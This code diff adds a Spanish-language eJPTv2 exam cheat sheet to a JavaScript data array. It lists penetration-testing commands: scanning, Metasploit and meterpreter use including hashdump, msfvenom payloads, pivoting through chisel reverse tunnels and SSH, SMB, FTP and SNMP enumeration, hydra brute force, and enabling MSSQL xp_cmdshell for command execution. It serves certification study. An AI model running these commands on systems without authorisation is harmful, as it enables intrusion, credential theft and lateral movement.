@@ -448,6 +448,140 @@ const DATA = [
         {p:"Logs, DB, capturas", code:`grep -riE "flag\\{|FLAG\\{|HTB\\{" / 2>/dev/null\nfind / -iname "*.pcap" -o -iname "*.log" -o -iname "*.db" 2>/dev/null\ntshark -r archivo.pcap -Y "frame contains \\"flag\\""`}
       ]}
     ]
+  },
+  {
+    id:"ejpt", title:"🎯 eJPTv2",
+    sections:[
+      {h:"Metodología / orden de ataque", blocks:[
+        {p:"Checklist al caer en un host nuevo", code:`1. nmap -p- --min-rate=1000 -T4 <IP>
+2. nmap -sC -sV -p<puertos> <IP> -oN nmap_detallado.txt
+3. Enumerar cada servicio encontrado (SMB, FTP, HTTP, etc.)
+4. Buscar credenciales / archivos sensibles
+5. Buscar exploits conocidos (searchsploit, msfconsole)
+6. Explotar y conseguir shell inicial
+7. Estabilizar shell (pty + stty)
+8. Enumerar para privesc (linpeas/winpeas)
+9. Escalar privilegios
+10. Flag + documentar todo (IP, puerto, cred, hallazgo)`},
+        {p:"Anotar TODO a medida que avanzás (no confiar en la memoria)", code:`# Formato sugerido por host
+IP: 
+Puertos abiertos: 
+Servicios + versiones: 
+Credenciales encontradas: 
+Vulnerabilidad explotada: 
+Shell obtenida como: 
+Privesc: `}
+      ]},
+      {h:"Metasploit Framework", blocks:[
+        {p:"Iniciar y buscar módulos", code:`msfconsole -q
+search type:exploit platform:linux <servicio>
+search cve:<año>-<numero>
+use <ruta/del/modulo>
+show options
+show payloads`},
+        {p:"Configurar y lanzar un exploit", code:`set RHOSTS <IP>
+set RPORT <puerto>
+set LHOST <IP_atacante>
+set LPORT <puerto_local>
+set PAYLOAD <payload>
+check
+run`},
+        {p:"Manejo de sesiones", code:`sessions -l
+sessions -i <id>
+background
+sessions -u <id>        # upgrade a meterpreter`},
+        {p:"Meterpreter — comandos básicos", code:`sysinfo
+getuid
+ps
+migrate <pid>
+shell
+upload <local> <remoto>
+download <remoto> <local>
+hashdump
+screenshot`},
+        {p:"Auxiliary modules (escaneo/enum sin explotar)", code:`use auxiliary/scanner/smb/smb_version
+use auxiliary/scanner/ftp/ftp_login
+use auxiliary/scanner/mysql/mysql_login
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <IP o rango>
+run`},
+        {p:"Generar y manejar payloads (msfvenom)", code:`msfvenom -l payloads | grep <linux/windows/php>
+msfvenom -p <payload> LHOST=<IP> LPORT=<puerto> -f <formato> -o salida`}
+      ]},
+      {h:"Pivoting (lo más importante del examen)", blocks:[
+        {p:"Detectar una segunda red desde un host comprometido", code:`ip a
+ifconfig
+route -n
+netstat -rn
+arp -a`},
+        {p:"Metasploit — autoroute (pivotear a través de una sesión)", code:`# dentro de meterpreter
+run autoroute -s <red_interna>/24
+background
+route add <red_interna> 255.255.255.0 <sesion_id>`},
+        {p:"Metasploit — socks proxy para usar herramientas externas", code:`use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 4a
+run -j
+# luego agregar a /etc/proxychains4.conf: socks4 127.0.0.1 1080
+proxychains nmap -sT -Pn <IP_interna>`},
+        {p:"portfwd — redirigir un puerto remoto a tu máquina", code:`# dentro de meterpreter
+portfwd add -l <puerto_local> -p <puerto_remoto> -r <IP_interna>`},
+        {p:"chisel — pivoting sin Metasploit (muy usado en eJPT)", code:`# atacante (servidor)
+./chisel server -p 8000 --reverse
+
+# víctima (cliente) — abre un SOCKS en el atacante
+./chisel client <IP_atacante>:8000 R:socks
+
+# luego en el atacante
+proxychains nmap -sT -Pn <IP_interna>`},
+        {p:"SSH — pivoting con tunneling (si tenés creds SSH en el host comprometido)", code:`# port forwarding local
+ssh -L <puerto_local>:<IP_interna>:<puerto_destino> usuario@<IP_pivote>
+
+# SOCKS proxy dinámico vía SSH
+ssh -D 1080 usuario@<IP_pivote>
+proxychains nmap -sT -Pn <IP_interna>`}
+      ]},
+      {h:"Enumeración SMB", blocks:[
+        {p:"Shares anónimos y enumeración básica", code:`smbclient -L //<IP>/ -N
+smbclient //<IP>/<share> -N
+enum4linux -a <IP>
+crackmapexec smb <IP> -u '' -p '' --shares`},
+        {p:"Montar un share y descargar todo", code:`smbclient //<IP>/<share> -N
+smb: \\> prompt off
+smb: \\> recurse on
+smb: \\> mget *`},
+        {p:"RID cycling / usuarios del dominio", code:`enum4linux -U <IP>
+crackmapexec smb <IP> -u 'guest' -p '' --users`}
+      ]},
+      {h:"FTP", blocks:[
+        {p:"Login anónimo", code:`ftp <IP>
+# usuario: anonymous, password: cualquiera / vacío
+ftp> ls -la
+ftp> get <archivo>`},
+        {p:"Fuerza bruta de FTP", code:`hydra -L usuarios.txt -P rockyou.txt ftp://<IP>`}
+      ]},
+      {h:"SNMP", blocks:[
+        {p:"Enumeración con community string por defecto", code:`snmpwalk -c public -v1 <IP>
+snmpwalk -c public -v2c <IP>
+onesixtyone -c community_strings.txt <IP>`}
+      ]},
+      {h:"MySQL / MSSQL", blocks:[
+        {p:"MySQL — login y enumeración básica", code:`mysql -h <IP> -u root -p
+mysql -h <IP> -u root -p -e "show databases;"`},
+        {p:"MSSQL — login con impacket", code:`mssqlclient.py <usuario>@<IP> -windows-auth
+# dentro: enable_xp_cmdshell y RCE
+SQL> EXEC sp_configure 'show advanced options', 1;
+SQL> RECONFIGURE;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> RECONFIGURE;
+SQL> xp_cmdshell 'whoami';`}
+      ]},
+      {h:"RDP", blocks:[
+        {p:"Conectar por RDP", code:`xfreerdp /u:<usuario> /p:<pass> /v:<IP> +clipboard
+rdesktop <IP> -u <usuario> -p <pass>`},
+        {p:"Fuerza bruta de RDP", code:`hydra -L usuarios.txt -P rockyou.txt rdp://<IP>`}
+      ]}
+    ]
   }
 ];
 
